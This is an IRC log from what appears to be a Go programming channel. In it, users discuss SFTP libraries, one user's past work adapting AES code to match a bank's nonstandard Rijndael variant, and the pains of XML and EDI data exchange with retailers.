[22:45:05] *** Joins: andlabs (~andlabs@68.237.68.71)
[22:45:54] *** Joins: HeraHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25)
[22:48:46] <edrocks> has anyone used github.com/jlaffaye/ftp for sftp or used sftp in general from go? Looking for a good package
[22:49:57] <edrocks> oh I guess sftp is over ssh so the ftp lib won't work at all
[22:50:04] <siXy> I've done sftp in go, but not with that. sftp is really quite different from ftp
[22:50:21] <siXy> you could probably do ftps with that, but that's a different (and terrible) thing
[22:50:37] <siXy> mind you the sftp protocol is *also* terrible, just for different reasons
[22:50:48] <edrocks> siXy which package did you use for sftp? I have to integrate with someone hosting an sftp server
[22:50:53] <siXy> IIRC there's something in /x/ for sftp, lemme have a look
[22:51:07] <edrocks> I found https://github.com/pkg/sftp which looks maintained at least
[22:52:50] <siXy> That's not what I used - thinking back I might have fdone it from scratch on top of the ssh protocol (this was a good number of years ago now), but that does indeed look reasonable
[22:53:10] <edrocks> siXy ah thank you for the info!
[22:53:48] *** Joins: aleph (~aleph@pool-98-116-232-112.nycmny.fios.verizon.net)
[22:53:48] *** Joins: meain (~meain@2001:470:69fc:105::2db)
[22:54:20] <siXy> also I had to implement my own aes because the bank I was talking to (that I won't name) didn't quite use aes, but instead an earlier version of the rijndael proposal that eventually became AES, and this was... not nice.
[22:54:38] <siXy> it was similar to aes, but not quite similar enough :(
[22:54:57] <icholy> siXy: did you start from scratch or modify an existing aes implementation?
[22:55:15] <siXy> I hacked up the stdlib one, as safely as I could
[22:55:53] <siXy> I did insist on a VPN to run this over though, as I didn't really trust it
[22:57:01] <edrocks> siXy that sounds horrible! I'm dealing with xml over sftp to sync some order data for retailers
[22:57:13] <siXy> well that sounds awful too :)
[22:57:14] <edrocks> they had a bunch of EDI options but xml + sftp seemed the most sane
[22:57:26] <edrocks> *from their list of options*
[22:57:41] *** Joins: Ohlov38951749 (~Ohlov3@host-091-097-116-035.ewe-ip-backbone.de)
[22:57:42] <siXy> I absolutely detest xml, but yeah I suspect they weren't about to support protos or whatever
[23:01:21] *** Quits: Ohlov3895174 (~0hlov3@dyndsl-080-228-185-213.ewe-ip-backbone.de) (Ping timeout: 252 seconds)
[23:03:05] *** Quits: vptr (~tadas@cpe-24-162-255-196.nc.res.rr.com) (Quit: leaving)
[23:03:30] *** Quits: meain (~meain@2001:470:69fc:105::2db) (Quit: Reconnecting)
[23:03:47] *** Joins: meain (~meain@2001:470:69fc:105::2db)
[23:05:30] *** Joins: whaley (~whaley@066-169-090-170.res.spectrum.com)
[23:08:05] *** Joins: ibejohn (~ibejohn@104.4.30.169)
[23:12:13] <edrocks> oh I'm lucky to have xml instead of having to scrape or use EDI which means you are charged per kilobyte and also have to make your own library from scratch for(not to mention most implementations are semi different so now you need it to work all over)
[23:14:59] <Tv_> a lot of EDI *is* XML, these days
[23:15:09] <Tv_> not that that would diminish the horror
[23:16:02] *** Quits: PedroG2 (~android@45.77.216.181) (Quit: Got you)
[23:16:16] *** Joins: PedroG1 (~android@45.77.216.181)
[23:19:32] *** Quits: aleph (~aleph@pool-98-116-232-112.nycmny.fios.verizon.net) (Quit: WeeChat info:version)
[23:20:55] <ibejohn> EDI ... Yikes ... having SAP nightmares at the mention of it
[23:20:55] <icholy> siXy: writing anything like that would be so daunting for me.
[23:20:59] *** Joins: shka (~herr@109.231.62.239)
[23:23:56] <icholy> siXy: did you at least have a working implementation of their "aes" to generate tests from?
[23:24:09] <siXy> icholy: I actually really enjoyed it once I got past the whole "you're doing WHAT?>!?!?!"
[23:25:18] <siXy> I don't recall exactly what I had to work it out, this is going back over 5 years now and memory fades, but there were some docs of parts of it, and a test server I think?
[23:26:09] *** Joins: llorllale (~llorllale@2607:9880:3a18:69:c4d7:b125:fab8:31b0)
[23:28:36] <edrocks> icholy I imagine you'd just get errors until you got the math working. Not that that is easy at all though but seems doable. Very cool siXy!
[23:28:41] *** KirkMcDo1ald is now known as KirkMcDonald
[23:29:04] <edrocks> the more scary part is did they give you a test env or force you to get this all working straight from prod
[23:30:31] <siXy> IIRC there was a test env, yeah
[23:35:28] *** mikeputnam1 is now known as mikeputnam
[23:36:08] *** Joins: ef (~thedawn@user/thedawn)
[23:36:31] *** ef is now known as Guest6353
[23:36:39] *** Quits: Guest6353 (~thedawn@user/thedawn) (Remote host closed the connection)
[23:39:40] *** Quits: fef (~thedawn@user/thedawn) (Ping timeout: 252 seconds)
[23:42:28] *** Quits: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com) (Quit: Textual IRC Client: www.textualapp.com)
[23:43:45] *** Quits: elastic_dog (~elastic_d@2a01:118f:822:9c00:2132:cd52:1e4a:f46a) (Ping timeout: 244 seconds)
[23:49:05] *** Joins: elastic_dog (~elastic_d@2a01:118f:822:9c00:2132:cd52:1e4a:f46a)
[23:53:56] *** Joins: dmathieu (~textual@pop.92-184-110-0.mobile.abo.orange.fr)
[23:55:41] *** Joins: Garb0 (~Garb0@user/garb0)
